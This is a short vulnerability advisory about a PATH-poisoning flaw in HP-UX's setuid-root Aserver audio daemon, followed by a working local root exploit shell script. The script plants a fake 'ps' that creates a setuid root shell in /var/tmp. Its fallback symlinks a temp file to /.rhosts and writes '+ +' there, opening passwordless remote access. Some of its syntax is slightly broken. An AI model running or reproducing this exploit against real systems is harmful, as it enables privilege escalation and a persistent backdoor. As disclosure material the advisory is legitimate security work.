source : http://www.securityfocus.com/bid/1929/info

Aserver is a server program that ships with HP-UX versions 10.x and above that is used to interface client applications with the audio hardware. Because it talks to hardware, it is installed setuid root by default. 

During normal execution, Aserver executes "ps" via the system() libcall, relying on the PATH environment variable to do so. As a result, a user can modify their PATH environment variable so that it includes an arbitrary program called 'ps' before executing Aserver. When Aserver is run with the -f argument, the offending system() function will be called and the attacker's version of ps will be executed as root. 

This is a trivial root compromise.


#!/bin/sh
#
# HP-UX aserver.sh - Loneguard 18/10/98
# Simple no brainer path poison followed by a twist [ inspired by DC ;) ]
#
cd /var/tmp
cat < _EOF > ps
#!/bin/sh
cp /bin/csh /var/tmp/.foosh
chmod 4755 /var/tmp/.foosh
_EOF
chmod 755 ps
PATH=.:$PATH
/opt/audio/bin/Aserver -f
if [ -e /var/tmp/.foosh ]
        # Hmmm, you not like that technique?
        cd /tmp
        rm last_uuid
        ln -s /.rhosts last_uuid
        /opt/audio/bin/Aserver -f
        echo "+ +" > /.rhosts
        # Haha, my Kungfu is the best!
fi
echo Crazy MONKEY!